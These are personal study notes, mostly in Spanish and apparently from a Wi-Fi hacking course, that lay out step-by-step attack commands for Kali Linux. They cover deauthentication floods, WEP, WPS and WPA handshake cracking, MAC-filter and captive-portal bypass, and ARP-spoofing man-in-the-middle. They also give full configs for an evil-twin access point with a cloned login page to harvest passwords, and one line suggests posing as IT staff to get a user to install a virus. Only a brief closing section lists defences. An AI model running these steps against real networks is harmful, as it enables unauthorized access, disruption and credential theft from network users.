ifconfig: lista todos los adaptadores conectados al pc
iwconfig: lista solo wirales interfaces 

MAC Address: asigned by manufactures se usan para edentificar pcs en el network y que la informacion se transmita del mac destinatario al mac destino
cambiar el mac adres te permite ser anonimo en la network o bypass filters para que parezcamos otro pc en la network

ponemos ifconfig el parametro ether indica el mac del adaptador

para cambiar el mac del adaptador wifi:
```
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
```
or
```
ifconfig wlan0 down
macchanger -r wlan0
ifconfig wlan0 up
```
(cuando reiniciamos el ordenador el mac volvera a ser el mismo si vuelve a ser el mismo antes de reiniciar el porque el administrador de la red 
a reiniciado las direciones mac de la red)

Manage Mode captura archivos que tengan como mac de destino el pc
Monitor Mode captura todos los archivosen el aire

cambiar adaptador a monitor mode:
```
ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```
si no funciona el metodo alternativo:
```
ifconfig wlan0 down
airmon-ng check kill
airmon-ng start wlan0
ifconfig wlan0mon up
```
para ver si a cambiado a monitor
```
iwconfig
```
Packet Sniffing Basics:
- for 2.4ghz
```
airodump-ng mon0
```
- for 5ghz
```
airodump-ng --band a mon0
```
- for 5ghz and 2.4
```
airodump-ng --band abg mon0
```

- BSSID: MAC de la red
- PWD: Mayor numero mejor señal
- Beacons: Frames que envia la red y indican que la red existe
- Data: Paquetes que luego usaremos
- S: Numero de paquetes capturados en los ultimos 10 segundos
- CH: Canal de la red
- MB: Velocidad maxima de la red
- ENC: Encriptacion de la red
- ESSID: Nombres de las redes


Target Packet Sniffing
```
airodump-ng --bssid (BSSID) --channel (Nº) --write (file name) mon0
```
en la parte extendida de informacion tenemos todos los dispositivos conectados a la red
- BSSID: MAC de la red
- Sation: Mac de dispositivos de la red
- PWR: Calidad de señal de los dispositivos
- Rate: Velocidad de conexion
- Lost: Informacion perdida
- FRAMES: Numero de paquetes capturados
- PROBE: Si el dispositovo esta buscando redes para conectarse

en el directorio principal tendremos varios archivos con la extencion -01 el principal que vamos a usar es el .cap 
que tiene que contener todos los datos enviados desde y hacia la red deve contener urls paswords y users pero esta encriptada
podemos abrir el archivo .cap en wireshark

## Deauthentication Attack:   
Vamos a pretender que somos el cliente cambiando nuestro mac a este y enviar al ruter la señal de desconexion y lo mismo con el cliente  
```
aireplay-ng --deauth 10000000 -a (BSSID) -c (STATION) mon0
```
if you want to do it in the background whitout output on the terminal (usful to deaut multiple targets)
```
aireplay-ng --deauth 10000000 -a (BSSID) -c (STATION) mon0 &> /dev/null &
jobs (see jobs runing)
kill %1 (kill job 1)
killall aireplay-ng
```
en algunos casos este comando no funcionara a menos que estemos usando airodump-ng contra la red objetivo
pra eso lanzamos el sigiente comando en la terminal de al lado
```
airodump-ng --bssid (BSSID) --channel (Nº) mon0
```
podemos por ejemplo llamar al usuario y decirle que somos del departamento it y convencerles de que instalen un virus

Deauthenticating All Clients From Protected WiFi Network
```
Terminal 1
airodump-ng --bssid (BSSID) --channel (Nº) mon0
Terminal 2
aireplay-ng --deauth 10000000 -a (BSSID) mon0
```

Deauthenticating Same Clien From Multiple Bands or Networks
```
Terminal 1
airodump-ng --bssid (BSSID) --channel (Nº 2.4gh) mon0
Terminal 2
airodump-ng --bssid (BSSID) --channel (Nº 5gh) mon0
Terminal 3 (Deaut from 2.4 network)
aireplay-ng --deauth 0 -a (BSSID) -c (STATION) mon0
Terminal 4 (deaut from 5GH network)
aireplay-ng --deauth 0 -a (BSSID) -c (STATION) -D mon0
```
## WEP Cracking:  
Initialization Vector (IV) + Key (Wifi Pasword) = Keystream  
Keystream + Data = Encripted data que se envia al ruter con el IV adjuntado para que el ruter la decodifique  
Los IV se repetiran porque solo son en 24bits al capturar varios IV repetidos podemos decodificar la Contraseña de la red  
1. airodump-ng capturamos una gran cantidad de paquete IV  
2. aircrack-ng analizamos y crackeamos la contraseña   
```
airodump-ng mon0
airodump-ng --bssid (BSSID) --channel (Nº) --write (file name) mon0
aircrack-ng (.cap file name)
```
Key Found (41:41:41:41:41)  
reiniciamos kali quitamos los : para obtener 4141414141 y nos conectamos a la red con esta contraseña  
o usamos el ASCII como contraseña si obtenemos esta  

Si la red WEP al escanear vemos que DATA tiene pocos paquetes
tendremos que forzar la punto de aceso para que genere nuevos IV
```
airodump-ng mon0
airodump-ng --bssid (BSSID) --channel (Nº) --write (file name) mon0
```
en la ventana del al lado mientra este comando este coriendo
```
ifconfig
aireplay-ng --fakeauth 0 -a (BSSID) -h (Mac del adaptador wifi los primeros 12 caracteres de unspec cambiar las - por :) mon0
```
de esta forma apareceremos como dispositivo asociado a la red
ahora empezamos a inllectar paquetes en la red y esperamos los paquetes ARP el ruter se vera forzado a generar nuevos paquetes con IVs
en la ventana de al lado coremos
```
aireplay-ng --arpreplay -b (BSSID) -h (Mac del adaptador wifi los primeros 12 caracteres de unspec cambiar las - por :) mon0
```
nos volvemos a asociar a la red por si acaso y coremos
```
aircrack-ng (.cap file)
```
## Cracking SKA WEP
Detect if AUTH is SKA after snifing the network and fakeauth it will show in the terminal 1 on the top in the network spesification 
```
airodump-ng mon0
Terminal 1:
airodump-ng --bssid (BSSID) --channel (Nº) --write (file name) mon0
Terminal 2:
aireplay-ng --fakeauth 0 -a (BSSID) -h (Mac del adaptador wifi los primeros 12 caracteres de unspec cambiar las - por :) mon0
```
Cracking the SKA network:  
We need to have a conected client to ckrak it  
```
Terminal 1:
airodump-ng --bssid (BSSID) --channel (Nº) --write (file name) mon0
Terminal 2:
aireplay-ng --arpreplay -b (BSSID) -h (STATION MAC) mon0
Terminal 3:
aircrack-ng (name-01.cap file)
```
Use the KEY Found whitout the : as a password

## WPS Crack
- https://ufile.io/lro4nkdv
solo funciona si el ruter no tiene protecion PBC push button autentification
```
wash --interface mon0
reaver --bssid (BSSID) --channel (Nº) -i mon0
```
Lck: muestra si el wps esta bloqueado porque despues de unos intentos se bloquea
```
run riwer whitout associate and associate using airplay-ng

reaver --bssid (BSSID) --channel (Nº) --interface mon0 -vvv --no-associate
or
reaver --bssid (BSSID) --channel (Nº) -i mon0 -A -vvv
```
si obtenemos error es que nesecitamos usar una vercion anterior de reaver porque esta no funciona bien
descargamos la vercion recomendada chmod +x reaver y ./reaver --bssid (BSSID) --channel (Nº) --interface mon0 -vvv --no-associate
mientras rever intenta brutforce la red coremos el sigiente comando en la terminal de aldo para que el ruter no nos ignore
ifconfig
```
aireplay-ng --fakeauth 30(nos asociamos cada 30 segundos) -a (BSSID) -h (Mac del adaptador wifi los primeros 12 caracteres de unspec cambiar las - por :) mon0
```
Bypassing 0x3 and 0x4 Errors
```
reaver --bssid (BSSID) --channel (Nº) -i mon0 --no-nacks
```
WPS Lock  
Now, the simplest way to get the water to unlock is to just the authenticate all the connected computers
and keep doing that for a long period of time until the user, one of the users will just think that
there is something happening in the network and just go in and turn off the router and turn it back on.
When they do that, the water will get unlocked and then you'll be able to run river again.  
mdk3 (exploit the router to fors it to reset)  
```
mdk3 mon0 a -a (BSSID) -m
```
## WPA / WPA2 Cracking  
solo los handshakes tienen informacion util  
captura de handshakes:  
```
airodump-ng mon0
airodump-ng --bssid (BSSID) --channel (Nº) --write (file name) mon0
```
ahora solo sientate y espera a recibir el handshake cuando se algun dispositivo se conecte a la red en la parte de la derecha de la ventana 

puedes para no esperar deautentificar al cliente este volvera a intentar conectarse y asi capturamos el handshake
```
aireplay-ng --deauth 4 -a (BSSID) -c (STATION) mon0
```
en la ventana de ariba a la derecha veremos el handshake

Creating a Wordlist
```
man crunch
crunch [min character number] [max character number] [Characters] -o [filename] -t [pattern]
crunch 6 8 123abc@$ -o wordlist -t a@@@@b
```
CRACK HANDSHAKE (Comparamos MIC)
```
aircrack-ng (.cap file) -w (worldlist .txt)
```
Hay empresas online donde puedes subir el handshake y ellos te lo analizan

## Bypassing Mac Filtering (Blacklists & Whitelists)
- Whitelists
```
1 Discover the conected witelisted clients
airodump-ng --bssid (BSSID) --channel (Nº) mon0
2. Change you mac to that witelisted mac (go Manage mode)
ifconfig wlan0 down
macchanger -m [Mac from Whitelist] wlan0
ifconfig wlan0 up
```
- Blacklists
```
ifconfig wlan0 down
macchanger -r wlan0
ifconfig wlan0 up
```

## Discovering Hidden Networks
```
1. We can see all info runing airdump but not the name
airodump-ng mon0
2. (Terminal 1) run airdump agenst that network
airodump-ng --bssid (BSSID) --channel (Nº) mon0
3. (Terminal 2) run deautentification atak
aireplay-ng --deauth -a (BSSID) -c (STATION) mon0
```
So, again, the attack is going to be very simple or we're going to do is we're going to do the authentication
attack for a very short period of time.  
That's going to disconnect the target device for a split second so they won't even feel it.
And the operating system will automatically connect back to the network.  
When it does that, it's going to send the network name in the air and we're sniffing on that channel.
So we'll be able to capture that name and we'll know the network name.  

## Captive Portals
- Bypassing Captive Portals
There are a number of ways to bypass captive portals depending on the way it is 
implemented:
1. Change MAC address to one of a connected client.
```
1 Discover the conected witelisted clients
airodump-ng --bssid (BSSID) --channel (Nº) mon0
2. Change you mac to that witelisted mac (go Manage mode)
ifconfig wlan0 down
macchanger -m [Mac from Whitelist] wlan0
ifconfig wlan0 up
```
2. Sniff logins in monitor mode.
- Since captive portals are open.
- IE: they do NOT use encryption;
- We can sniff data sent to/from it using airodump-ng.
- Then use Wireshark to read this data including passwords.
```
1 sniff data sent to/from it using airodump-ng
airodump-ng --bssid (BSSID) --channel (Nº) --write airport mon0
2. Deautentificate a conected client so he is force to login back
aireplay-ng --deauth 10000000 -a (BSSID) -c (STATION) mon0
3. Use Wireshark and look for http and post request to find the login and password
```
3. Connect and sniff logins after running an arp spoofing attack.
- Since captive portals are open;
- Therefore we can connect to the target without a password;
- We can then run a normal arp spoofing attack;
    - Clients will automatically lose their connection and will be asked to login again
    - Data sent to/from router including passwords will be directed to us
```
1. Go to manage mode
2. Conect to the network
3. Do a MITM attak to arp spoof the entier network
mitmf --arp --spoof -i wlan0 --gateway 192.168.1.1
or
ettercap -Tq -M arp:remote -i wlan0 ///
4. The users will be asked to enter their login credentials again and you will cach them
```
4. Create a fake AP, ask users to login.
- Clone the login page used by the captive portal.
    - Save the page in firefox move it to folthe rename the html file to index.html and run the server apache or python3
    - if wee have problems whit relativ paths just edit the index.html file and in start the href whit a / like href="/welcome/base.css"
    - to do it automaticli open it in Geany copy the href="foldername go to seatch replace and replace it whit href="/foldername click replace all and In Document
    - Make sure that the Usernam Password and Submit buton arr wrapt in Form tag if its not add it manualy: Open Geany open Find search for <input and Log in to locate all the tags to wrap add <form method="post" action="/index.html"></form>
    - Set the Log In button to be a input if its not <input style="copy past the style" type="submit" value="Log In"></input>
- Create a fake AP with the same/similar name.
    - A router broadcasting signal -> use wifi card with hostapd.
    - A DHCP server to give IPs to clients -> use dnsmasq.
    - A DNS server to handle dns requests -> use dnsmasq.
```
sudo apt install hostapd dnsmasq
services network-manager stop
```
run this .sh 
```
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
```
run this dnsmasq.conf
```
#Set the wifi interface
interface=wlan0

#Set the IP range that can be given to clients
dhcp-range=10.0.0.10,10.0.0.100,8h

#Set the gateway IP address
dhcp-option=3,10.0.0.1

#Set dns server address
dhcp-option=6,10.0.0.1

#Redirect all requests to 10.0.0.1
address=/#/10.0.0.1
```
```
dnsmasq -C dnsmasq.conf
```
run this hostapd.conf
```
#Set wifi interface
interface=wlan0

#Set network name
ssid=royal wifi v2

#Set chennel
channel=1

#Set driver
driver=nl80211
```
```
hostapd hostapd.conf -B
```
Set the IP for the adapter look at dnsmasq.conf
```
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
```

Generating Fake SSL Certificate
```
oppenssl req -new -x509 -days 365 -out /root/downloads/fake-ap/cert.pem -keyout /root/Downloads/fake-ap/cert.key
a2enmod ssl
```

Redirecting Requests To Captive Portal Login Page  
start the apache with the fake login page
```
leafpad /etc/apache2/ports.conf
Listen 443

leafpad /etc/apache2/sites-enabled/000-default.conf

<VirtualHost *:80>
    ErrorDocument 404 /
</VirtualHost>

<VirtualHost *:443>
    SSLEngine On
    SSLCertificateFile /root/downloads/fake-ap/cert.pem
    SSLCertificateKeyFile /root/Downloads/fake-ap/cert.key
</VirtualHost>

<Directory "/var/wwww/html">
    RewriteEngine On
    RewriteBase /
    RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
    RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
    
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^(.*)$ / [L,QSA]
<Directory>

service apache2 start
or
service apache2 restart
```

- Deauth users to use the fake network with the cloned page.
```
Terminal 1
airodump-ng --bssid (BSSID) --channel (Nº) mon0
Terminal 2
aireplay-ng --deauth 10000000 -a (BSSID) mon0
```
- Sniff the login info!
```
tshark -i wlan0 -w royal-wifi.cap
open wireshark and search http and look for post request
```


## Conclucion:
no usar wep  
usar wpa2 con contraseñas complejas  
asegurar que wps esta desabilitado  
use 802.11w para protejerte de deautentificaciones
usa WPA Enterprice envez de mac filtering

obtenemos la ip del ordenador ifconfig wlan0 vamos a la ip 1 de la subnet para entrar en la pagina del router  
si nos atacan con deautentificacion nos podemos conectar con el cable  
Access Control podemos especificar que mac permitimos conectar a la red y cuales no  

## Get Alfa awus036nha to work with Kali Linux
1. Install firmware-atheros
```
apt-get install firmware-atheros
```
Try to uninstall and reinstall the firmware if it already exists:
```
apt-get remove firmware-atheros
apt-get install firmware-atheros
```
2. Enable USB3 on VirtualBox
- Set the USB 3.0 (xHCI) Controller under USB settings on virtual box
3. Reboot from console 
```
reboot
```
## WordLists
- ftp://ftp.openwall.com/pub/wordlists/
- http://www.openwall.com/mirrors/
- https://github.com/danielmiessler/SecLists
- http://www.outpost9.com/files/WordLists.html
- http://www.vulnerabilityassessment.co.uk/passwords.htm
- http://packetstormsecurity.org/Crackers/wordlists/
- http://www.ai.uga.edu/ftplib/natural-language/moby/
- http://www.cotse.com/tools/wordlists1.htm
- http://www.cotse.com/tools/wordlists2.htm
- http://wordlist.sourceforge.net/

